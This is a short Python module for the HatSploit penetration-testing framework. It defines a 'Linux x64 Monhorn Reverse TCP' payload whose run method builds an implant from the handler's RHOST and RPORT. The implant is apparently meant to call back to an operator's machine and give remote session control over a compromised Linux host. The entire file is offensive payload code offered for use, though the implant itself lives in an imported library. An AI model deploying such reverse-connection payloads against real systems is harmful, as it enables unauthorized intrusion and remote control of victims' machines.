"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload import Payload
from monhorn import Monhorn
from monhorn.session import MonhornSession


class HatSploitPayload(Payload, Monhorn):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "Linux x64 Monhorn Reverse TCP",
            'Payload': "linux/x64/monhorn_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "Monhorn reverse TCP payload for Linux x64.",
            'Architecture': "x64",
            'Platform': "linux",
            'Session': MonhornSession,
            'Rank': "high",
            'Type': "reverse_tcp",
        }

    def run(self):
        return self.get_monhorn(
            self.details['Platform'],
            self.details['Architecture'],
            self.handler['RHOST'],
            self.handler['RPORT'],
        )
